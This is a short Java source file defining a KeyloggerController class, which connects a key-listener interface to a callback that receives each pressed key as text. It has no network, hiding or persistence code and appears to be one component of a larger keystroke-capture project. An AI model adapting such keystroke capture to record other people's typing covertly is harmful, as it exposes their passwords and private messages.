package adapters.keyloggerController;

import java.util.function.Consumer;
import adapters.interfaces.IKeylistenner;
import adapters.keyIdAdapter.KeyIdAdapter;
import entities.keyEvent.KeyEvent;

public class KeyloggerController {
    private Consumer<String> onKeyPressed;
    private IKeylistenner keylistenner;

    public KeyloggerController() {}

    public KeyloggerController setKeylistenner(IKeylistenner keylistenner) {
        this.keylistenner = keylistenner;
        return this;
    }

    public KeyloggerController setConsumer(Consumer<String> onKeyPressed) {
        this.onKeyPressed = onKeyPressed;
        return this;
    }

    public void init() {
        this.keylistenner
            .setOnKeyPressedMethod((KeyEvent key) -> {
                this.onKeyPressed.accept(KeyIdAdapter.parseKeyIdToText(key.keyId));
            })
            .init();
    }

    public void stop() {
        this.keylistenner.stop();
    }
}
